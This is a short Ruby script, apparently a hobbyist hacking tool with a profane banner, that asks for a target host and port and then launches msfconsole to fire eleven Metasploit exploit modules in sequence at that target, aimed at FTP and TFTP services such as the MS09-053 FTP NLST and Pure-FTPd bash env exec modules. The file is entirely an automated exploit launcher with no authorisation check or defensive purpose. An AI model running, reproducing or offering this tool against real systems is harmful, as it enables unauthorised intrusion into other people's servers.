require 'colorize'
#    -x 'setg VERBOSE true'
#  -x 'setg RPORT #{$port}'
#  -x 'setg IMAPUSER #{user}' -x 'setg IMAPPASS #{user}'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """ 
     Its A Cluster Fuck Boys!! Lets Gets it!!!
""".red
puts """
		      COMBO Fucking WOMBO
""".white

puts " [?] What is the target? ".blue
print "[!] ---> ".yellow

$target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow

$port = gets.chomp


begin
ensure
exec("msfconsole -x 'use exploit/windows/ftp/open_ftpd_wbem' -x 'setg RHOST #{$target}'  -x 'setg RPORT #{$port}' -x 'run' -x 'back' -x 'use exploit/windows/ftp/ms09_053_ftpd_nlst' -x 'setg RHOST #{$target}'  -x 'setg RPORT #{$port}' -x 'run' -x 'back' -x 'use exploit/windows/ftp/netterm_netftpd_user' -x 'setg RHOST #{$target}'  -x 'setg RPORT #{$port}' -x 'run' -x 'back' -x 'use exploit/windows/tftp/opentftp_error_code' -x 'setg RHOST #{$target}' -x 'setg RPORT #{$port}' -x 'run' -x 'back' -x 'use exploit/windows/ftp/oracle9i_xdb_ftp_unlock' -x 'setg RHOST #{$target}'  -x 'setg RPORT #{$port}' -x 'run' -x 'back' -x 'use exploit/windows/ftp/oracle9i_xdb_ftp_pass' -x 'setg RHOST #{$target}'  -x 'setg RPORT #{$port}' -x 'run' -x 'back' -x 'use exploit/multi/ftp/pureftpd_bash_env_exec' -x 'setg RHOST #{$target}'  -x 'setg RPORT #{$port}' -x 'run' -x 'back' -x 'use exploit/windows/tftp/tftpdwin_long_filename' -x 'setg RHOST #{$target}' -x 'setg RPORT #{$port}' -x 'run' -x 'back' -x 'use exploit/windows/tftp/quick_tftp_pro_mode' -x 'setg RHOST #{$target}' -x 'setg RPORT #{$port}' -x 'run' -x 'back' -x 'use exploit/windows/tftp/threectftpsvc_long_mode' -x 'setg RHOST #{$target}' -x 'setg RPORT #{$port}' -x 'run' -x 'back' -x 'use exploit/windows/ftp/wsftp_server_503_mkd' -x 'setg RHOST #{$target}'  -x 'setg RPORT #{$port}' -x 'run'")
end







